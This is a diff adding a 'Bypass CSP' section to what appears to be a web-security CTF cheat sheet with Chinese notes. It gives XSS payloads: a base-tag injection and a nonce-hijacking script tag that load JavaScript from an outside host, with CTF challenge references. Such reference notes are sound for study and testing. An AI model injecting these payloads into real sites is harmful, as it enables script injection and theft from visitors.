@@ -2120,6 +2120,36 @@ xxe.dtd:
         - wave在apache mime type中沒有被定義
         - `<script src="uploads/this_file.wave">`
 
+## CSP evaluator
+
+https://csp-evaluator.withgoogle.com/
+
+## Bypass CSP
+
+- base
+    - 改變資源載入的域，引入惡意的js
+    - `<base href ="http://kaibro.tw/">`
+    - RCTF 2018 - rBlog
+
+- script nonce
+    
+    ```
+     <p>可控內容<p>
+     <script src="xxx" nonce="AAAAAAAAAAA"></script>
+    ```
+
+    插入`<script src="http//kaibro.tw/uccu.js" a="`
+
+    ```
+     <p><script src="http//kaibro.tw/uccu.js" a="<p>
+     <script src="xxx" nonce="AAAAAAAAAAA"></script>
+    ```
+
+- google analytics ea
+    - ea is used to log actions and can contain arbitary string
+    - Google CTF 2018 - gcalc2
+
+
 ## Online Encoding / Decoding
 - http://monyer.com/demo/monyerjs/
 
